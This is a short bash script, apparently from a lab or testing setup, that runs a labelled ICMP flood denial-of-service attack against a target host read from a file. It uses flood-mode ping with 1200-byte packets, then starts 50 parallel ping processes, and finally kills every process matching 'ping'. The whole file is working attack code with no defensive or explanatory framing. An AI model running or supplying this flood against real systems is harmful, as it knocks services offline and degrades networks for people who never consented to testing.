#!/usr/bin/env bash
source /tmp/target.var

echo "[+] Starting ICMP Flood Attack"
echo "[+] Target: ${TARGET_HOST}"
echo "[+] Attack details:"
echo "    - Tool: ping (fallback)"
echo "    - Duration: 10 seconds"
echo "    - Payload: Large packets"
echo "    - Mode: Flood (maximum speed)"
echo ""

# Alternative using ping with large packets and flood mode
# -f = flood mode (root required)
# -s 1200 = packet size 1200 bytes
timeout 10 ping -f -s 1200 ${TARGET_HOST} 2>&1 | tail -5

# Or use multiple parallel pings
echo "[+] Starting parallel ping flood..."
for i in {1..50}; do
    ping -s 1200 -c 100 ${TARGET_HOST} > /dev/null 2>&1 &
done

# Wait for all pings to complete or timeout
sleep 10
pkill -f ping 2>/dev/null

echo ""
echo "[+] Attack completed!"
echo "[+] Generated high-volume ICMP flood with large payloads"
